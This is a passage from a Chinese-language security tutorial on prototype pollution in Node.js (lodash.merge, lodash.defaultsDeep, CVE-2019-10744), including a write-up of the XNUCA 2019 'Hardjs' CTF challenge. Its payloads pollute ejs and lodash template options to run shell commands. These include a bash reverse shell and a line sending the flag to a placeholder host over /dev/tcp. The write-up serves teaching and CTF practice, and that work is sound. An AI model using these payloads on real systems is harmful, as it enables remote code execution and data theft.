    <span class="nx">resave</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
    <span class="nx">saveUninitialized</span><span class="o">:</span> <span class="kc">false</span>
<span class="p">}))</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">engine</span><span class="p">(</span><span class="s1">'ejs'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">filePath</span><span class="p">,</span> <span class="nx">options</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// define the template engine</span>
    <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="nx">filePath</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">content</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="nx">err</span><span class="p">))</span>
        <span class="kd">let</span> <span class="nx">compiled</span> <span class="o">=</span> <span class="nx">lodash</span><span class="p">.</span><span class="nx">template</span><span class="p">(</span><span class="nx">content</span><span class="p">)</span>
        <span class="kd">let</span> <span class="nx">rendered</span> <span class="o">=</span> <span class="nx">compiled</span><span class="p">({...</span><span class="nx">options</span><span class="p">})</span>

        <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">rendered</span><span class="p">)</span>
    <span class="p">})</span>
<span class="p">})</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">'views'</span><span class="p">,</span> <span class="s1">'./views'</span><span class="p">)</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">'view engine'</span><span class="p">,</span> <span class="s1">'ejs'</span><span class="p">)</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">data</span> <span class="o">||</span> <span class="p">{</span><span class="nx">language</span><span class="o">:</span> <span class="p">[],</span> <span class="nx">category</span><span class="o">:</span> <span class="p">[]}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">method</span> <span class="o">==</span> <span class="s1">'POST'</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">data</span> <span class="o">=</span> <span class="nx">lodash</span><span class="p">.</span><span class="nx">merge</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span>
        <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span>
    <span class="p">}</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">'index'</span><span class="p">,</span> <span class="p">{</span>
        <span class="nx">language</span><span class="o">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">language</span><span class="p">,</span> 
        <span class="nx">category</span><span class="o">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">category</span>
    <span class="p">})</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Example app listening on port 3000!`</span><span class="p">))</span>
</pre></div>
<p>还是先找造成漏洞产生的函数=&gt;lodash.merge</p>
<p>这里很简单：用 <code>lodash.merge</code> 方法将用户提交的信息合并到 session 里面去，多次提交， session 里最终保存用户提交的所有信息。</p>
<p>主要是找到污染点在哪？上文说过一般选择污染sourceURL</p>
<p>Payload：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="s2">"__proto__"</span><span class="o">:</span><span class="p">{</span><span class="s2">"sourceURL"</span><span class="o">:</span><span class="s2">"\u000areturn e =&gt;{return global.process.mainModule.constructor._load('child_process').execSync('id')}"</span><span class="p">}}</span>
<span class="err">#</span><span class="nx">\u000a</span> <span class="nx">Unicode编码表示换行</span>
</pre></div>
<h3 data-content="1" id="f594d80872ebd48da63b7ad88331161b">配合 ejs 模板引擎实现 RCE</h3>
<p>几个exp：</p>
<div class="highlight"><pre><span></span><span class="nx">命令执行</span>
<span class="p">{</span><span class="s2">"__proto__"</span><span class="o">:</span><span class="p">{</span><span class="s2">"outputFunctionName"</span><span class="o">:</span><span class="s2">"_tmp1;global.process.mainModule.require(\'child_process\').execSync('calc');var __tmp2"</span><span class="p">}}</span>

<span class="p">{</span><span class="s2">"__proto__"</span><span class="o">:</span><span class="p">{</span><span class="s2">"outputFunctionName"</span><span class="o">:</span><span class="s2">"_tmp1;global.process.mainModule.require(\'child_process\').exec('calc');var __tmp2"</span><span class="p">}}</span>
<span class="nx">反弹shell</span>
<span class="p">{</span><span class="s2">"__proto__"</span><span class="o">:</span><span class="p">{</span><span class="s2">"outputFunctionName"</span><span class="o">:</span><span class="s2">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\"');var __tmp2"</span><span class="p">}}</span>
</pre></div>
<p>还是通过例题来具象地分析</p>
<h4 data-content="1" id="6e9e7478c8484eafb5b0fb671cae4dd3">[XNUCA 2019 Qualifier]Hardjs</h4>
<p>源码：<a href="https://github.com/NeSE-Team/OurChallenges/blob/master/XNUCA2019Qualifier/Web/hardjs/source/server.js" target="_blank">https://github.com/NeSE-Team/OurChallenges/blob/master/XNUCA2019Qualifier/Web/hardjs/source/server.js</a></p>
<p>关键源码：</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'fs'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'body-parser'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">lodash</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'lodash'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">session</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express-session'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">randomize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'randomatic'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">mysql</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'mysql'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">mysqlConfig</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"./config/mysql"</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">ejs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'ejs'</span><span class="p">)</span>

<span class="p">...</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/get"</span><span class="p">,</span><span class="nx">auth</span><span class="p">,</span><span class="nx">async</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">,</span><span class="nx">next</span><span class="p">){</span>

    <span class="kd">var</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">userid</span> <span class="p">;</span> 
    <span class="kd">var</span> <span class="nx">sql</span> <span class="o">=</span> <span class="s2">"select count(*) count from `html` where userid= ?"</span>
    <span class="c1">// var sql = "select `dom` from  `html` where userid=? ";</span>
    <span class="kd">var</span> <span class="nx">dataList</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">query</span><span class="p">(</span><span class="nx">sql</span><span class="p">,[</span><span class="nx">userid</span><span class="p">]);</span>

    <span class="k">if</span><span class="p">(</span><span class="nx">dataList</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">count</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">){</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({})</span>

    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">dataList</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">count</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// if len &gt; 5 , merge all and update mysql</span>

        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"Merge the recorder in the database."</span><span class="p">);</span> 

        <span class="kd">var</span> <span class="nx">sql</span> <span class="o">=</span> <span class="s2">"select `id`,`dom` from  `html` where userid=? "</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">raws</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">query</span><span class="p">(</span><span class="nx">sql</span><span class="p">,[</span><span class="nx">userid</span><span class="p">]);</span>
        <span class="kd">var</span> <span class="nx">doms</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="kd">var</span> <span class="nx">ret</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span> 

        <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">raws</span><span class="p">.</span><span class="nx">length</span> <span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
            <span class="nx">lodash</span><span class="p">.</span><span class="nx">defaultsDeep</span><span class="p">(</span><span class="nx">doms</span><span class="p">,</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span> <span class="nx">raws</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">dom</span> <span class="p">));</span>    <span class="c1">// 漏洞点</span>

            <span class="kd">var</span> <span class="nx">sql</span> <span class="o">=</span> <span class="s2">"delete from `html` where id = ?"</span><span class="p">;</span>
            <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">query</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span><span class="nx">raws</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">id</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="kd">var</span> <span class="nx">sql</span> <span class="o">=</span> <span class="s2">"insert into `html` (`userid`,`dom`) values (?,?) "</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">query</span><span class="p">(</span><span class="nx">sql</span><span class="p">,[</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">doms</span><span class="p">)</span> <span class="p">]);</span>

        <span class="k">if</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">affectedRows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
            <span class="nx">ret</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">doms</span><span class="p">);</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">ret</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">([{}]);</span>
        <span class="p">}</span>

    <span class="p">}</span><span class="k">else</span> <span class="p">{</span>

        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"Return recorder is less than 5,so return it without merge."</span><span class="p">);</span>
        <span class="kd">var</span> <span class="nx">sql</span> <span class="o">=</span> <span class="s2">"select `dom` from  `html` where userid=? "</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">raws</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">query</span><span class="p">(</span><span class="nx">sql</span><span class="p">,[</span><span class="nx">userid</span><span class="p">]);</span>
        <span class="kd">var</span> <span class="nx">ret</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>

        <span class="k">for</span><span class="p">(</span> <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span><span class="mi">0</span> <span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span> <span class="nx">raws</span><span class="p">.</span><span class="nx">length</span> <span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
            <span class="nx">ret</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span> <span class="nx">raws</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">dom</span> <span class="p">));</span>
        <span class="p">}</span>

        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">ret</span><span class="p">);</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">ret</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">});</span>

<span class="p">...</span>
</pre></div>
<p>/get路由，发送请求大于5条就会把所有查询结果merge到一起，使用的是lodash.defaultsDeep，这是前面提到的可以控制数组（对象）的“键名”的函数。与lodash.defaultsDeep相关的漏洞是<code>CVE-2019-10744</code>.</p>
<p>根据<code>CVE-2019-10744</code>的信息，我们知道</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">"type"</span><span class="p">:</span><span class="s2">"test"</span><span class="p">,</span><span class="nt">"content"</span><span class="p">:{</span><span class="nt">"prototype"</span><span class="p">:{</span><span class="nt">"constructor"</span><span class="p">:{</span><span class="nt">"a"</span><span class="p">:</span><span class="s2">"b"</span><span class="p">}}}}</span>
</pre></div>
<p>在合并时便会在<code>Object</code>上附加<code>a=b</code>这样一个属性，任意不存在a属性的原型为Object的对象在访问其<code>a</code>属性时均会获取到<code>b</code>属性。</p>
<p>接下来需要找到污染点</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">source</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">generateSource</span><span class="p">();</span>
  <span class="nx">prepended</span> <span class="o">+=</span> <span class="s1">'  var __output = [], __append = __output.push.bind(__output);'</span> <span class="o">+</span> <span class="s1">'\n'</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">prepended</span> <span class="o">+=</span> <span class="s1">'  var '</span> <span class="o">+</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span> <span class="o">+</span> <span class="s1">' = __append;'</span> <span class="o">+</span> <span class="s1">'\n'</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">_with</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">prepended</span> <span class="o">+=</span>  <span class="s1">'  with ('</span> <span class="o">+</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">localsName</span> <span class="o">+</span> <span class="s1">' || {}) {'</span> <span class="o">+</span> <span class="s1">'\n'</span><span class="p">;</span>
    <span class="nx">appended</span> <span class="o">+=</span> <span class="s1">'  }'</span> <span class="o">+</span> <span class="s1">'\n'</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nx">appended</span> <span class="o">+=</span> <span class="s1">'  return __output.join("");'</span> <span class="o">+</span> <span class="s1">'\n'</span><span class="p">;</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">source</span> <span class="o">=</span> <span class="nx">prepended</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">source</span> <span class="o">+</span> <span class="nx">appended</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>这里不用全看懂，就是把opts.outputFunctionName进行拼接传递给prepended，然后prepended再进行拼接传递给</p>
<p>this.source</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">compileDebug</span><span class="p">){</span>
    <span class="nx">src</span><span class="o">=</span><span class="s1">'varline 1'</span><span class="o">+</span><span class="s1">'\n'</span>

        <span class="o">+</span><span class="s1">',__lines ='</span><span class="o">+</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">templateText</span><span class="p">)</span><span class="o">+</span><span class="s1">'\n'</span>

        <span class="o">+</span><span class="s1">',__filename ='</span><span class="o">+</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">filename</span><span class="o">?</span>

        <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">filename</span><span class="p">)</span><span class="o">:</span><span class="s1">'undefined'</span><span class="p">)</span><span class="o">+</span><span class="s1">';'</span><span class="o">+</span><span class="s1">'\n'</span>
        <span class="o">+</span><span class="s1">'try{'</span><span class="o">+</span><span class="s1">'\n'</span>

        <span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">source</span>

        <span class="o">+</span><span class="s1">'}catch (e){'</span><span class="o">+</span><span class="s1">'\n'</span>

        <span class="o">+</span><span class="s1">' rethrow(e,__lines,__filename,__line,escapeFn);'</span><span class="o">+</span><span class="s1">'\n'</span>

        <span class="o">+</span><span class="s1">'}'</span><span class="o">+</span><span class="s1">'\n'</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">else</span>
<span class="nx">src</span><span class="o">=</span><span class="k">this</span><span class="p">.</span><span class="nx">source</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>这里又将this.source做拼接后传递给了src</p>
<div class="highlight"><pre><span></span><span class="k">else</span> <span class="p">{</span>
    <span class="nx">ctor</span> <span class="o">=</span> <span class="nb">Function</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nx">fn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctor</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">localsName</span> <span class="o">+</span> <span class="s1">', escapeFn, include, rethrow'</span><span class="p">,</span> <span class="nx">src</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>这里终于是出现了一个动态函数，参数就是我们的src，所以如果我们覆盖了<code>opts.outputFunctionName</code>即可触发模版编译处的RCE。</p>
<p>Payload:</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">"type"</span><span class="p">:</span><span class="s2">"test"</span><span class="p">,</span><span class="nt">"content"</span><span class="p">:{</span><span class="nt">"constructor"</span><span class="p">:{</span><span class="nt">"prototype"</span><span class="p">:</span>
<span class="p">{</span><span class="nt">"outputFunctionName"</span><span class="p">:</span><span class="s2">"a=1;process.mainModule.require('child_process').exec('b</span>
<span class="s2">ash -c \"echo $FLAG&gt;/dev/tcp/xxxxx/xx\"')//"</span><span class="p">}}}}</span>
</pre></div>
<p>向 <code>/add</code> 路由发送 6 次请求</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240311115713-715028ae-df5b-1.png"/></p>
<p>然后访问 <code>/get</code> 路由进行原型链污染，最后访问 <code>/</code> 或 <code>/login</code> 路由触发 <code>render</code> 函数进行 ejs 模板 RCE，成功反弹 Shell</p>
<h1 data-content="1" id="156be2f3d8272f93b3d38de1bb1765f9">后记</h1>
<p>写的不是很专业，挺通俗的，比较适合刚入门的，写的不对的地方，欢迎指正</p>
</div>
</div>